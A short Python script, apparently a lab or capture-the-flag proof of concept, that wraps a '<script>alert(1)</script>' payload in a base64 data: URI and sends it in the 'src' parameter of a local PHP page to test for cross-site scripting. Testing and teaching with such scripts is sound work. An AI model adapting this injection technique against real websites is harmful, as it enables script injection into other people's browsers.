import requests
import base64

def main():
	payload = "<script>alert(1)</script>"
	payload = base64.b64encode(payload.encode()).decode()
	payload = f"data:text/html;base64,{payload}"
	# 'data:' -> data url/uri scheme
	# 'text/html;' -> mime type of the data
	# 'base64' -> encoding type of following data
	response = requests.get(f"http://localhost:8080/index.php?page=media&src={payload}")
	print(response.text)

if __name__ == "__main__":
	main()